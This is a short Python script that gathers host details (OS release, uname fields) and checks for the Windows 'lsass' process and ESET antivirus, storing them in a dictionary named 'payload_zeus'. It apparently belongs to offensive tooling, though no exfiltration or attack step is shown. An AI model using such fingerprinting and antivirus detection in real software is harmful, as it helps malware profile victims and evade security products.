#!/usr/bin/python
#Every plataform
from platform import linux_distribution, uname
import sys
import json
import psutil

def OperatingSystem(payload_zeus):
  if linux_distribution()[1] == ' ':
    payload_zeus["Public Release:"] = linux_distribution()[1]
  for i in range(0, len(uname())):
    payload_zeus[uname()._fields[i]] = uname()[i]
  for proc in psutil.process_iter():
      try:
          pinfo = proc.as_dict(attrs=['name'])
      except psutil.NoSuchProcess:
          pass
      if "lsass" in str(pinfo):
        payload_zeus["lsass"] = "Activated"
      if "ekrn" in str(pinfo):
        payload_zeus["antivirus"] = "ESET"
  if not "lsass" in str(payload_zeus): 
    payload_zeus["lsass"] = "Not found or desactivated"
  if not "antivirus" in str(payload_zeus):
    payload_zeus["antivirus"] =  "Not found or desactivated"  
  return payload_zeus

  
